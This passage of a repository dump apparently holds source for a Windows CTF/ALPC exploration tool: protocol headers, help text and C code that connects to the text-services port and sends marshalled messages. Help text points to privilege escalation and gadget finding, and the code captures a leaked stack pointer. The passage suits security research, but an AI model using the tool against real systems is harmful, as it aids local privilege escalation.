osk.exe on x64.\\n\"\r\n    \"You should use full SYSWOW64 paths if you need access to 32bit executables.\";\r\n\r\nstatic const char ScriptDoc[] =\r\n    \"Usage: script [FILENAME]\\n\"\r\n    \"The specified file is read and interpreted as commands. For the duration\\n\"\r\n    \"Of the script, verbosity is reduced.\";\r\n\r\nstatic const char ConsentDoc[] =\r\n    \"Usage: consent [COMMAND]\\n\"\r\n    \"Unprivileged users can trigger the UAC consent dialog, which is a highly\\n\"\r\n    \"privileged CTF client. This might be useful for privilege escalation.\\n\";\r\n\r\nstatic const char RegDoc[] =\r\n    \"Usage: reg [HKLM|HKCU|HKCR] VALUE SUBKEY\\n\"\r\n    \"Lookup a DWORD value in the registry, and store it in the regval variable.\\n\"\r\n    \"This is intended for scripting.\\n\"\r\n    \"In addition, because it is so common, if VALUE is a REG_SZ and a valid\\n\"\r\n    \"integer, it will be automatically translated into a DWORD.\\n\";\r\n\r\nstatic const char WindowDoc[] =\r\n    \"Usage: window\\n\"\r\n    \"Create and register a window with the monitor. This allows you to log\\n\"\r\n    \"window messages received from other ctf clients or servers.\\n\";\r\n\r\nstatic const char GadgetDoc[] =\r\n    \"Usage: gadget MODULE BYTESTRING\\n\"\r\n    \"Find the first offset of BYTESTRING in MODULE. The result is stored in\\n\"\r\n    \"the gadget variable, as well as printed.\\n\\n\"\r\n    \"Examples:\\n\"\r\n    \" ctf> gadget kernel32 413168c4\\n\";\r\n\r\nstatic const char SectionDoc[] =\r\n    \"Usage: section MODULE SECTIONNAME PROPERTY\\n\"\r\n    \"Parse the section header of MODULE, find a section named SECTIONNAME and\\n\"\r\n    \"print the value of PROPERTY. PROPERTY should be a member of\\n\"\r\n    \"IMAGE_SECTION_HEADER, such as VirtualAddress.\\n\\n\"\r\n    \"The result is stored in the secval variable for scripting.\\n\\n\"\r\n    \"Examples:\\n\"\r\n    \" ctf> section kernel32 .text PointerToRawData\\n\";\r\n\r\n#endif\r\n"
        },
        {
          "name": "ctfinternal.h",
          "type": "blob",
          "size": 4.67578125,
          "content": "#ifndef __CTFINTERNAL_H\n#define __CTFINTERNAL_H\n\n#define MSGFLAG_COMMAND         0x000FFFFF\n#define MSGFLAG_DOCUMENT        0x00100000\n#define MSGFLAG_DATAVIEW        0x04000000\n#define MSGFLAG_IMESERVER       0x08000000\n#define MSGFLAG_CACHED_REPLY    0x20000000\n#define MSGFLAG_DATA_APPENDED   0x80000000\n\nenum {\n    MSG_NOOP = 0x01,\n    MSG_FINDPROPERTY = 0x04,\n    MSG_GETPROPERTY = 0x05,\n    MSG_SETPROPERTY = 0x06,\n    MSG_CALLSTUB = 0x0A,\n    MSG_CREATESTUB = 0x0B,\n    MSG_STUBCLEANUP = 0x0C,\n    // MSG_GET??? = 0x15,\n    // MSG_SET??? = 0x16,\n    MSG_GETCLIENTINFO = 0x1B,\n    MSG_GETCLIENTINFOEX = 0x19,\n    MSG_GETTHREADHWND = 0x20,\n    MSG_SETTHREADHWND = 0x21,\n    //MSG_FIND??? = 0x22,\n    //MSG_FIND??? = 0x23,\n    MSG_SETKBLAYOUT = 0x24,\n    MSG_SETPROFILE = 0x25,\n    MSG_GETMONITORPID = 0x38,\n    //...\n\n    MSG_KEYEVENT = 0x68,\n\n    // >= 0xC8 <= 0xDC are IME messages\n    MSG_REMOVEINPUTPROFILE = 0xC9,\n    MSG_SETRANGETEXT = 0xD1,\n    MSG_REQUESTEDITSESSION = 0xD5,\n    MSG_CANCELEDITSESSION = 0xD6,\n    MSG_ADDHOTKEY = 0xDB,\n    MSG_REMOVEHOTKEY = 0xDC,\n};\n\ntypedef struct _CTF_MSGBASE {\n    PORT_MESSAGE Header;\n    DWORD Message;\n    DWORD SrcThreadId;\n    DWORD DstThreadId;\n    DWORD Result;\n    union {\n        struct _CTF_MSGBASE_PARAM_MARSHAL {\n            DWORD ulNumParams;\n            DWORD ulDataLength;\n            UINT64 pData;\n        };\n        DWORD Params[3];\n    };\n} CTF_MSGBASE, *PCTF_MSGBASE;\n\n#define CLIENT_FLAG_IME 0x40000000\n\ntypedef struct _CTF_CONNECT_MSG {\n    PORT_MESSAGE Header;\n    DWORD ProcessId;\n    DWORD ThreadId;\n    DWORD TickCount;\n    DWORD ClientFlags;\n    union {\n        UINT64 QuadWord;\n        HWND WindowId;\n    };\n} CTF_CONNECT_MSG, *PCTF_CONNECT_MSG;\n\n\n#define MARSHAL_FLAG_INPUT      0x00001\n#define MARSHAL_FLAG_OUTPUT     0x00002\n#define MARSHAL_FLAG_ARRAY      0x00004 // The value is the element count.\n#define MARSHAL_FLAG_ALLOCATED  0x00020 // Set if you want space allocated for the array.\n#define MARSHAL_FLAG_PRESENT    0x00010\n\n#define MARSHAL_TYPE_MASK 0xfff00\n\nenum {\n    MARSHAL_TYPE_DATA   = 0x00000,  // Arbitrary sized data.\n    MARSHAL_TYPE_COM    = 0x00100,  // COM Object StubID?\n    MARSHAL_TYPE_INT    = 0x00200,  // 32bit integer? (size must still be 8)\n    MARSHAL_TYPE_STR    = 0x00400,  // SysAllocString\n    MARSHAL_TYPE_GDI    = 0x00800,  // GDI Resource\n    MARSHAL_TYPE_ICON   = 0x02000,  // HICON\n    MARSHAL_TYPE_STRUCT = 0x08000,\n    MARSHAL_TYPE_LONG   = 0x10000,  // Dunno, some integer type (size == 8)\n    MARSHAL_TYPE_WORD   = 0x20000,  // 16bit integer. (size must still be 8)\n    MARSHAL_TYPE_MEM    = 0x40000,  // CoTaskMemAlloc\n};\n\ntypedef struct _CTF_MARSHAL_PARAM {\n    DWORD Start;\n    DWORD Size;\n    DWORD TypeFlags;\n    DWORD Reserved;\n} CTF_MARSHAL_PARAM, *PCTF_MARSHAL_PARAM;\n\ntypedef struct _CTF_MARSHAL_COMSTUB {\n    GUID Interface;\n    DWORD StubId;\n    DWORD Timestamp;\n} CTF_MARSHAL_COMSTUB, *PCTF_MARSHAL_COMSTUB;\n\ntypedef struct _CTF_PROXY_SIGNATURE {\n    GUID Interface;\n    DWORD FunctionIndex;\n    DWORD StubId;\n    DWORD Timestamp;\n    DWORD field_1C; // I've never seen these fields used, but ctfmon is strict about the size of the signature.\n    DWORD field_20; \n    DWORD field_24;\n} CTF_PROXY_SIGNATURE, *PCTF_PROXY_SIGNATURE;\n\ntypedef struct _KNOWN_INTERFACE {\n    const CHAR *Name;\n    const GUID *Interface;\n} KNOWN_INTERFACE, *PKNOWN_INTERFACE;\n\nDEFINE_GUID(IID_IAICProxy, 0xC1A97C88,\n            0xDE59, 0x470F,\n            0xAD, 0xCB, 0xA6, 0xC9, 0x16, 0xFC, 0xA6, 0xC2);\nDEFINE_GUID(IID_IAICEventSink, 0x70f2f87b,\n            0x1319, 0x4156,\n            0x8b, 0xfB, 0x69, 0xa3, 0x5c, 0x25, 0x0e, 0x31);\nDEFINE_GUID(IID_IObjectWithSite, 0x0FC4801A3,\n            0x2BA9,\n            0x11CF,\n            0xA2, 0x29, 0, 0xAA, 0, 0x3D, 0x73, 0x52);\n\nstatic const KNOWN_INTERFACE KnownInterfaces[] = {\n    { \"IID_ITfInputProcessorProfileMgr\", &IID_ITfInputProcessorProfileMgr },\n    { \"IID_ITfCompartmentMgr\", &IID_ITfCompartmentMgr },\n    { \"IID_ITfCompartment\", &IID_ITfCompartment },\n    { \"IID_ITfInputProcessorProfileMgr\", &IID_ITfInputProcessorProfileMgr },\n    { \"IID_IEnumTfInputProcessorProfiles\", &IID_IEnumTfInputProcessorProfiles },\n    { \"IID_IUnknown\", &IID_IUnknown },\n    { \"IID_ITfInputProcessorProfiles\", &IID_ITfInputProcessorProfiles },\n    { \"IID_ITfInputProcessorProfilesEx\", &IID_ITfInputProcessorProfilesEx },\n    { \"IID_ITfInputProcessorProfileSubstituteLayout\", &IID_ITfInputProcessorProfileSubstituteLayout },\n    { \"IID_ITfSource\", &IID_ITfSource },\n    { \"IID_IAICProxy\", &IID_IAICProxy },\n    { \"IID_IAICEventSink\", &IID_IAICEventSink },\n    { \"IID_IObjectWithSite\", &IID_IObjectWithSite },\n    { \"IID_ITfLangBarItemMgr\", &IID_ITfLangBarItemMgr },\n    { \"IID_IEnumTfLangBarItems\", &IID_IEnumTfLangBarItems },\n};\n\n#endif\n"
        },
        {
          "name": "ctftool.c",
          "type": "blob",
          "size": 10.74609375,
          "content": "#define WIN32_LEAN_AND_MEAN\r\n#define WIN32_NO_STATUS\r\n#include <windows.h>\r\n#include <winternl.h>\r\n#include <initguid.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <msctf.h>\r\n#undef WIN32_NO_STATUS\r\n#include <ntstatus.h>\r\n\r\n#include \"ntdll.h\"\r\n#include \"ntalpctyp.h\"\r\n#include \"ntalpc.h\"\r\n\r\n#include \"wineditline/src/editline/readline.h\"\r\n#include \"ctfinternal.h\"\r\n#include \"ctftool.h\"\r\n#include \"marshal.h\"\r\n#include \"util.h\"\r\n#include \"messages.h\"\r\n#include \"command.h\"\r\n\r\n#pragma warning(disable : 4090 6011)\r\n\r\nFARPROC AlpcInitializeMessageAttribute;\r\nFARPROC AlpcGetMessageAttribute;\r\nFARPROC GUIDFromString;\r\n\r\nBOOL InitializeAlpcRoutines()\r\n{\r\n    HMODULE NtDll = GetModuleHandle(\"NTDLL\");\r\n    HMODULE Shell32 = LoadLibrary(\"SHELL32\");\r\n\r\n    if (NtDll == NULL)\r\n        return FALSE;\r\n\r\n    if (Shell32 == NULL)\r\n        return FALSE;\r\n\r\n    AlpcInitializeMessageAttribute = GetProcAddress(NtDll, \"AlpcInitializeMessageAttribute\");\r\n    AlpcGetMessageAttribute = GetProcAddress(NtDll, \"AlpcGetMessageAttribute\");\r\n    AlpcGetMessageAttribute = GetProcAddress(NtDll, \"AlpcGetMessageAttribute\");\r\n    GUIDFromString = GetProcAddress(Shell32, MAKEINTRESOURCE(704));\r\n    return TRUE;\r\n}\r\n\r\nBOOL GetServerPortName(PWCHAR Name, SIZE_T NameMax)\r\n{\r\n    WCHAR DesktopName[MAX_PATH];\r\n    HDESK ThreadDesktop;\r\n    DWORD NameLength;\r\n    DWORD SessionId;\r\n\r\n    // Note that it is not necessary to close this handle.\r\n    ThreadDesktop = GetThreadDesktop(GetCurrentThreadId());\r\n\r\n    // Find the SessionId from the PEB.\r\n    SessionId = NtCurrentTeb()->ProcessEnvironmentBlock->SessionId;\r\n\r\n    // Find the name of the current desktop.\r\n    if (GetUserObjectInformationW(ThreadDesktop,\r\n                                  UOI_NAME,\r\n                                  DesktopName,\r\n                                  sizeof DesktopName,\r\n                                  &NameLength)) {\r\n        _snwprintf(Name, NameMax / sizeof(WCHAR), L\"\\\\BaseNamedObjects\\\\msctf.server%s%u\",\r\n                                                  DesktopName,\r\n                                                  SessionId);\r\n        return TRUE;\r\n    }\r\n\r\n    return FALSE;\r\n}\r\n\r\nHANDLE OpenAlpcPort(PWCHAR AlpcPortName, PPORT_MESSAGE ConnectMessage, SIZE_T MessageSize)\r\n{\r\n    OBJECT_ATTRIBUTES ObjectAttributes;\r\n    UNICODE_STRING PortName;\r\n    ALPC_PORT_ATTRIBUTES PortAttributes;\r\n    HANDLE AlpcHandle = INVALID_HANDLE_VALUE;\r\n    ULONG BufferLength = 64;\r\n    NTSTATUS Result;\r\n\r\n    RtlInitUnicodeString(&PortName, AlpcPortName);\r\n    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);\r\n    InitializeMessageHeader(ConnectMessage, MessageSize, LPC_CONNECTION_REQUEST);\r\n\r\n    ZeroMemory(&PortAttributes, sizeof PortAttributes);\r\n\r\n    PortAttributes.SecurityQos.Length = sizeof(PortAttributes.SecurityQos);\r\n    PortAttributes.SecurityQos.ContextTrackingMode = TRUE;\r\n    PortAttributes.MaxMessageLength = 512;\r\n    PortAttributes.DupObjectTypes = 0x88000000;\r\n\r\n    Result = NtAlpcConnectPort(&AlpcHandle,\r\n                               &PortName,\r\n                               &ObjectAttributes,\r\n                               &PortAttributes,\r\n                               0,\r\n                               NULL,\r\n                               ConnectMessage,\r\n                               &BufferLength,\r\n                               NULL,\r\n                               NULL,\r\n                               NULL);\r\n\r\n    if (!NonInteractive) {\r\n        LogMessage(stdout, \"NtAlpcConnectPort(\\\"%S\\\") => %#x\", AlpcPortName, Result);\r\n    }\r\n\r\n    return AlpcHandle;\r\n}\r\n\r\nNTSTATUS SendReceiveMarshalData(HANDLE AlpcHandle,\r\n                                ULONG TypeFlags,\r\n                                PCTF_MARSHAL_PARAM Params,\r\n                                ULONG ParamCount,\r\n                                DWORD DestinationThread)\r\n{\r\n    NTSTATUS Result;\r\n    SIZE_T BufferLength;\r\n    PCTF_MSGBASE SendReceiveBuffer;\r\n\r\n    // We need enough space to append the Params, it has to be a contiguous buffer.\r\n    BufferLength = sizeof(CTF_MSGBASE) + GetParamsSize(Params, ParamCount);\r\n\r\n    // Allocate and initialize.\r\n    SendReceiveBuffer = calloc(BufferLength, 1);\r\n\r\n    // Append marshal parameters.\r\n    memcpy(&SendReceiveBuffer[1], Params, GetParamsSize(Params, ParamCount));\r\n\r\n    // Configure Message.\r\n    SendReceiveBuffer->Message = TypeFlags;\r\n    SendReceiveBuffer->SrcThreadId = ClientThreadId;\r\n    SendReceiveBuffer->DstThreadId = DestinationThread;\r\n\r\n    SendReceiveBuffer->ulNumParams  = ParamCount;\r\n    SendReceiveBuffer->ulDataLength = GetParamsSize(Params, ParamCount);\r\n\r\n    // Send the data.\r\n    Result = SendReceivePortMessage(AlpcHandle,\r\n                                    &SendReceiveBuffer->Header,\r\n                                    BufferLength,\r\n                                    NULL);\r\n\r\n    // Check if the send worked.\r\n    if (Result != 0) {\r\n        goto cleanup;\r\n    }\r\n\r\n    // Copy the RPC result.\r\n    Result = SendReceiveBuffer->Result;\r\n\r\n    // The monitor leaks a stack pointer here.\r\n    LeakedStackPointer = SendReceiveBuffer->pData;\r\n\r\n    // Restore data so that caller can see any returned data.\r\n    memcpy(Params, &SendReceiveBuffer[1], GetParamsSize(Params, ParamCount));\r\n\r\n  cleanup:\r\n    // All done with our copy.\r\n    free(SendReceiveBuffer);\r\n    return Result;\r\n}\r\n\r\n// I don't know what these are, so make them accessible via set.\r\nUINT64 ProxyExtra1;\r\nUINT64 ProxyExtra2;\r\nUINT64 ProxyExtra3;\r\n\r\nNTSTATUS SendReceiveProxyData(HANDLE AlpcHandle,\r\n                              ULONG TypeFlags,\r\n                              PCTF_MARSHAL_PARAM Params,\r\n                              ULONG ParamCount,\r\n                              PCTF_MARSHAL_COMSTUB Stub,\r\n                              DWORD FunctionIndex,\r\n                              DWORD DestinationThread)\r\n{\r\n    NTSTATUS Result;\r\n    SIZE_T BufferLength;\r\n    PCTF_MSGBASE SendReceiveBuffer;\r\n    PCTF_MARSHAL_PARAM ParamPtr;\r\n    CTF_PROXY_SIGNATURE ProxySignature  = {\r\n        .FunctionIndex = FunctionIndex,\r\n        .StubId = Stub->StubId,\r\n        .Timestamp = Stub->Timestamp,\r\n        .field_1C = ProxyExtra1,\r\n        .field_20 = ProxyExtra2,\r\n        .field_24 = ProxyExtra3,\r\n    };\r\n\r\n    // Copy the correct GUID over from the Stub.\r\n    memcpy(&ProxySignature.Interface, &Stub->Interface, sizeof(GUID));\r\n\r\n    // We need enough space to append the Params, it has to be a contiguous buffer.\r\n    BufferLength = sizeof(CTF_MSGBASE) + sizeof(CTF_PROXY_SIGNATURE) + GetParamsSize(Params, ParamCount);\r\n\r\n    // Allocate and initialize.\r\n    SendReceiveBuffer = calloc(BufferLength, 1);\r\n\r\n    // Append proxy parameters.\r\n    ParamPtr = mempcpy(&SendReceiveBuffer[1], &ProxySignature, sizeof(CTF_PROXY_SIGNATURE));\r\n\r\n    // Append marshalled parameters.\r\n    memcpy(ParamPtr, Params, GetParamsSize(Params, ParamCount));\r\n\r\n    // When parameters are Proxied, their base offset needs to adjusted because of the Proxy header.\r\n    for (int i = 0; i < ParamCount; i++) {\r\n        ParamPtr[i].Start += sizeof(CTF_PROXY_SIGNATURE);\r\n    }\r\n\r\n    // Configure Message.\r\n    SendReceiveBuffer->Message = TypeFlags;\r\n    SendReceiveBuffer->SrcThreadId = ClientThreadId;\r\n    SendReceiveBuffer->DstThreadId = DestinationThread;\r\n\r\n    // As far as I can tell, only this parameter is used.\r\n    SendReceiveBuffer->ulDataLength = sizeof(ProxySignature) + GetParamsSize(Params, ParamCount);\r\n    SendReceiveBuffer->ulNumParams = ParamCount;\r\n\r\n    // Send the data.\r\n    Result = SendReceivePortMessage(AlpcHandle,\r\n                                    &SendReceiveBuffer->Header,\r\n                                    BufferLength,\r\n                                    NULL);\r\n\r\n    if (Result != 0) {\r\n        goto cleanup;\r\n    }\r\n\r\n    Result = SendReceiveBuffer->Result;\r\n\r\n    // Restore the adjusted Base\r\n    for (int i = 0; i < ParamCount; i++) {\r\n        ParamPtr[i].Start -= sizeof(CTF_PROXY_SIGNATURE);\r\n    }\r\n\r\n    // Restore data so that caller can see any returned data.\r\n    memcpy(Params, ParamPtr, GetParamsSize(Params, ParamCount));\r\n\r\n  cleanup:\r\n    // All done with our copy.\r\n    free(SendReceiveBuffer);\r\n    return Result;\r\n}\r\n\r\nNTSTATUS SendReceivePortMessage(HANDLE AlpcHandle,\r\n                                PPORT_MESSAGE PortMessage,\r\n                                ULONG BufferLength,\r\n                                PLARGE_INTEGER Timeout)\r\n{\r\n    NTSTATUS Result;\r\n    ULONG MessageAttributeSize;\r\n    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes = NULL;\r\n\r\n    Result = AlpcInitializeMessageAttribute(0x60000000, NULL, 0, &MessageAttributeSize);\r\n\r\n    if (Result != STATUS_BUFFER_TOO_SMALL) {\r\n        LogMessage(stderr, \"unexpected result from AlpcInitializeMessageAttribute()\");\r\n        goto cleanup;\r\n    }\r\n\r\n    ReceiveMessageAttributes = calloc(1, MessageAttributeSize);\r\n\r\n    if (AlpcInitializeMessageAttribute(0x60000000,\r\n                                       ReceiveMessageAttributes,\r\n                                       MessageAttributeSize,\r\n                                       &MessageAttributeSize) < 0) {\r\n        LogMessage(stderr, \"AlpcInitializeMessageAttribute failed\");\r\n        goto cleanup;\r\n    }\r\n\r\n    ReceiveMessageAttributes->ValidAttributes = 0;\r\n\r\n    InitializeMessageHeader(PortMessage, BufferLength, 0);\r\n\r\n    Result = NtAlpcSendWaitReceivePort(AlpcHandle,\r\n                                       ALPC_MSGFLG_SYNC_REQUEST,\r\n                                       PortMessage,\r\n                                       NULL,\r\n                                       PortMessage,\r\n                                       &BufferLength,\r\n                                       ReceiveMessageAttributes,\r\n                                       Timeout);\r\n\r\ncleanup:\r\n    free(ReceiveMessageAttributes);\r\n    return Result;\r\n}\r\n\r\nint main(int argc, char **argv)\r\n{\r\n    PCHAR CommandLine;\r\n    ULONG Result = 1;\r\n    HANDLE MessageThread;\r\n\r\n    InitializeAlpcRoutines();\r\n\r\n    MessageThread = CreateThread(NULL, 0, MessageHandlerThread, NULL, 0, NULL);\r\n\r\n    ClientThreadId = GetCurrentThreadId();\r\n\r\n    LogMessage(stdout, \"An interactive ctf exploration tool by @taviso.\");\r\n    LogMessage(stdout, \"Type \\\"help\\\" for available commands.\");\r\n\r\n    LogMessage(stdout, \"Most commands require a connection, see \\\"help connect\\\".\");\r\n\r\n    read_history(\".ctfhistory\");\r\n\r\n    do {\r\n        CommandLine = readline(\"ctf> \");\r\n\r\n        //  Check for EOF.\r\n        if (CommandLine == NULL)\r\n            break;\r\n\r\n        // Save this to the history so that arrow keys work.\r\n        add_history(CommandLine);\r\n\r\n        Result = DispatchCommand(CommandLine);\r\n\r\n        rl_free(CommandLine);\r\n    } while (Result != 0);\r\n\r\n    // Record all our commands.\r\n    write_history(\".ctfhistory\");\r\n\r\n    // Cleanup.\r\n    if (PortHandle)\r\n        CloseHandle(PortHandle);\r\n    if (MessageWindow)\r\n        DestroyWindow(MessageWindow);\r\n\r\n    return 0;\r\n}\r\n"
        },
        {
          "name": "ctftool.h",
          "type": "blob",
          "size": 1.173828125,
          "content": "#ifndef __CTFTOOL_H\r\n#define __CTFTOOL_H\r\n\r\nHWND CreateMessageWindow();\r\n\r\nNTSTATUS SendReceivePortMessage(HANDLE PortHandle,\r\n                                PPORT_MESSAGE PortMessage,\r\n                                ULONG BufferLength,\r\n                                PLARGE_INTEGER Timeout);\r\nNTSTATUS SendReceiveProxyData(HANDLE PortHandle,\r\n                              ULONG TypeFlags,\r\n                              PCTF_MARSHAL_PARAM Params,\r\n                              ULONG ParamCount,\r\n                              PCTF_MARSHAL_COMSTUB Stub,\r\n                              DWORD FunctionIndex,\r\n                              DWORD DestinationThread);\r\nNTSTATUS SendReceiveMarshalData(HANDLE PortHandle,\r\n                                ULONG TypeFlags,\r\n                                PCTF_MARSHAL_PARAM Params,\r\n                                ULONG ParamCount,\r\n                                DWORD DestinationThread);\r\n\r\nHANDLE OpenAlpcPort(PWCHAR AlpcPortName, PPORT_MESSAGE ConnectMessage, SIZE_T MessageSize);\r\nBOOL InitializeAlpcRoutines();\r\n\r\nextern FARPROC AlpcInitializeMessageAttribute;\r\nextern FARPROC AlpcGetMessageAttribute;\r\nextern FARPROC GUIDFromString;\r\n\r\n#endif\r\n"
        },
        {
          "name": "docs",
          "type": "tree",
          "content": null
        },
        {
          "name": "marshal.c",
          "type": "blob",
          "size": 8.23046875,
          "content": "#define WIN32_LEAN_AND_MEAN\r\n#define WIN32_NO_STATUS\r\n#include <windows.h>\r\n#include <winternl.h>\r\n#include <objbase.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <assert.h>\r\n#include <msctf.h>\r\n#include <stdbool.h>\r\n#undef WIN32_NO_STATUS\r\n#include <ntstatus.h>\r\n\r\n#include \"ntdll.h\"\r\n#include \"ntalpctyp.h\"\r\n#include \"ntalpc.h\"\r\n\r\n#include \"ctfinternal.h\"\r\n#include \"ctftool.h\"\r\n#include \"util.h\"\r\n\r\n#pragma warning(disable: 6031 6308 28182)\r\n\r\n// Calculate size for malloc of the existing params.\r\nSIZE_T GetParamsSize(PCTF_MARSHAL_PARAM Base, ULONG Count)\r\n{\r\n    SIZE_T Size = Count * sizeof(CTF_MARSHAL_PARAM);\r\n\r\n    for (ULONG i = 0; i < Count; i++) {\r\n        Size += Base[i].Size;\r\n    }\r\n\r\n    return Size;\r\n}\r\n\r\nvoid MarshalParamsDumpData(PCTF_MARSHAL_PARAM Base, ULONG Index)\r\n{\r\n    LogMessage(stderr, \"Dumping Marshal Parameter %u (Base %p, Type %#x, Size %#x, Offset %#x)\",\r\n                       Index,\r\n                       Base,\r\n                       Base[Index].TypeFlags,\r\n                       Base[Index].Size,\r\n                       Base[Index].Start);\r\n\r\n    hexdump((PVOID)((PBYTE)(Base) + Base[Index].Start), Base[Index].Size);\r\n\r\n    switch (Base[Index].TypeFlags & MARSHAL_TYPE_MASK) {\r\n        default:\r\n            LogMessage(stderr, \"No support for decoding type %#x\", Base[Index].TypeFlags);\r\n            // fallthrough\r\n        case MARSHAL_TYPE_STRUCT:\r\n        case MARSHAL_TYPE_DATA: {\r\n            GUID *GuidData = (PVOID)((PBYTE)(Base) + Base[Index].Start);\r\n            WCHAR GuidString[64];\r\n\r\n            // Just look at the hexdump above, I guess.\r\n            LogMessage(stdout, \"Marshalled Value %u, DATA\", Index);\r\n\r\n            // Well, I'll parse it for you if it's a GUID.\r\n            if (Base[Index].Size == sizeof(GUID)) {\r\n                StringFromGUID2(GuidData, GuidString, _countof(GuidString));\r\n                LogMessage(stdout, \"Possibly a GUID, %S\", GuidString);\r\n            }\r\n\r\n            break;\r\n        }\r\n\r\n        // The value returned is the GUID followed by a Stub ID.\r\n        case MARSHAL_TYPE_COM: {\r\n            PCTF_MARSHAL_COMSTUB Stub = (PVOID)((PBYTE)(Base) + Base[Index].Start);\r\n            WCHAR Interface[64];\r\n\r\n            // This is a marshalled comstub\r\n            assert(Base[Index].Size == sizeof(CTF_MARSHAL_COMSTUB));\r\n\r\n            StringFromGUID2(&Stub->Interface, Interface, _countof(Interface));\r\n\r\n            LogMessage(stdout, \"Marshalled Value %u, COM %S, ID %u, Timestamp %#x\",\r\n                               Index,\r\n                               Interface,\r\n                               Stub->StubId,\r\n                               Stub->Timestamp);\r\n            break;\r\n        }\r\n        case MARSHAL_TYPE_LONG:\r\n        case MARSHAL_TYPE_WORD:\r\n        case MARSHAL_TYPE_INT: {\r\n            PINT64 Value = (PVOID)((PBYTE)(Base) + Base[Index].Start);\r\n            if (Base[Index].Size == sizeof(INT64)) {\r\n                LogMessage(stdout, \"Marshalled Value %u, INT %016llx\", Index, *Value);\r\n            } else {\r\n                LogMessage(stderr, \"Invalid INT Size %#x, Cannot decode.\", Base[Index].Size);\r\n            }\r\n            break;\r\n        }\r\n    }\r\n    return;\r\n}\r\n// Insert the data for param Index\r\nPVOID MarshalParamsInsertData(PCTF_MARSHAL_PARAM Base,\r\n                              ULONG Count,\r\n                              ULONG Index,\r\n                              DWORD TypeFlags,\r\n                              PVOID Data,\r\n                              SIZE_T Size,\r\n                              BOOL FreeOrig)\r\n{\r\n    SIZE_T CurrentSize;\r\n\r\n    // If Base is NULL, allocate space for headers.\r\n    if (Base == NULL) {\r\n        Base = calloc(Count, sizeof(CTF_MARSHAL_PARAM));\r\n    }\r\n\r\n    CurrentSize = GetParamsSize(Base, Count);\r\n    Base = realloc(Base, CurrentSize + Size);\r\n    Base[Index].Size = Size;\r\n    Base[Index].TypeFlags = TypeFlags;\r\n    Base[Index].Start = CurrentSize;\r\n\r\n    // Duplicate the specified data.\r\n    if (Data) {\r\n        memcpy((PBYTE)(Base) + CurrentSize, Data, Size);\r\n    }\r\n\r\n    if (FreeOrig)\r\n        free(Data);\r\n\r\n    return Base;\r\n}\r\n\r\nvoid MarshalParamsFree(PCTF_MARSHAL_PARAM Base)\r\n{\r\n    free(Base);\r\n}\r\n\r\n// Translate a CTF command name into a string.\r\nPCHAR GetCommandName(UCHAR Command)\r\n{\r\n    static char *MessageNames[UCHAR_MAX] = {\r\n        [MSG_NOOP]              = \"MSG_NOOP\",\r\n        [MSG_FINDPROPERTY]      = \"MSG_FINDPROPERTY\",\r\n        [MSG_GETPROPERTY]       = \"MSG_GETPROPERTY\",\r\n        [MSG_SETPROPERTY]       = \"MSG_SETPROPERTY\",\r\n        [MSG_CALLSTUB]          = \"MSG_CALLSTUB\",\r\n        [MSG_CREATESTUB]        = \"MSG_CREATESTUB\",\r\n        [MSG_STUBCLEANUP]       = \"MSG_STUBCLEANUP\",\r\n        [MSG_GETCLIENTINFO]     = \"MSG_GETCLIENTINFO\",\r\n        [MSG_GETCLIENTINFOEX]   = \"MSG_GETCLIENTINFOEX\",\r\n        [MSG_GETTHREADHWND]     = \"MSG_GETTHREADHWND\",\r\n        [MSG_SETTHREADHWND]     = \"MSG_SETTHREADHWND\",\r\n        [MSG_SETKBLAYOUT]       = \"MSG_SETKBLAYOUT\",\r\n        [MSG_SETPROFILE]        = \"MSG_SETPROFILE\",\r\n        [MSG_GETMONITORPID]     = \"MSG_GETMONITORPID\",\r\n        [MSG_KEYEVENT]          = \"MSG_KEYEVENT\",\r\n        [MSG_REMOVEINPUTPROFILE]= \"MSG_REMOVEINPUTPROFILE\",\r\n        [MSG_SETRANGETEXT]      = \"MSG_SETRANGETEXT\",\r\n        [MSG_REQUESTEDITSESSION]= \"MSG_REQUESTEDITSESSION\",\r\n        [MSG_CANCELEDITSESSION] = \"MSG_CANCELEDITSESSION\",\r\n        [MSG_ADDHOTKEY]         = \"MSG_ADDHOTKEY\",\r\n        [MSG_REMOVEHOTKEY]      = \"MSG_ADDHOTKEY\",\r\n    };\r\n\r\n    return MessageNames[Command];\r\n}\r\n\r\n// Translate a name into a number.\r\nINT GetCommandNum(PCHAR Command)\r\n{\r\n    for (INT i = 0; i < UCHAR_MAX; i++) {\r\n        PCHAR Name = GetCommandName(i);\r\n        if (Name && strcmp(Name, Command) == 0)\r\n            return i;\r\n    }\r\n\r\n    return -1;\r\n}\r\n\r\nPCHAR GetMarshalFlagName(DWORD Flag)\r\n{\r\n    static struct {\r\n        DWORD Flag;\r\n        PCHAR Name;\r\n    } FlagNames[] = {\r\n        { MARSHAL_FLAG_INPUT, \"MARSHAL_FLAG_INPUT\" },\r\n        { MARSHAL_FLAG_OUTPUT, \"MARSHAL_FLAG_OUTPUT\" },\r\n        { MARSHAL_FLAG_ARRAY, \"MARSHAL_FLAG_ARRAY\" },\r\n        { MARSHAL_FLAG_ALLOCATED, \"MARSHAL_FLAG_ALLOCATED\" },\r\n        { MARSHAL_FLAG_PRESENT, \"MARSHAL_FLAG_PRESENT\" },\r\n        { MARSHAL_TYPE_DATA, \"MARSHAL_TYPE_DATA\" },\r\n        { MARSHAL_TYPE_COM, \"MARSHAL_TYPE_COM\" },\r\n        { MARSHAL_TYPE_INT, \"MARSHAL_TYPE_INT\" },\r\n        { MARSHAL_TYPE_STR, \"MARSHAL_TYPE_STR\" },\r\n        { MARSHAL_TYPE_GDI, \"MARSHAL_TYPE_GDI\" },\r\n        { MARSHAL_TYPE_ICON, \"MARSHAL_TYPE_ICON\" },\r\n        { MARSHAL_TYPE_STRUCT, \"MARSHAL_TYPE_STRUCT\" },\r\n        { MARSHAL_TYPE_LONG, \"MARSHAL_TYPE_LONG\" },\r\n        { MARSHAL_TYPE_WORD, \"MARSHAL_TYPE_WORD\" },\r\n        { MARSHAL_TYPE_MEM, \"MARSHAL_TYPE_MEM\" },\r\n    };\r\n\r\n    for (ULONG i = 0; i < _countof(FlagNames); i++) {\r\n        if (FlagNames[i].Flag == Flag)\r\n            return FlagNames[i].Name;\r\n    }\r\n\r\n    return NULL;\r\n}\r\n\r\nBOOL GetMarshalFlagsString(DWORD Flags, PCHAR 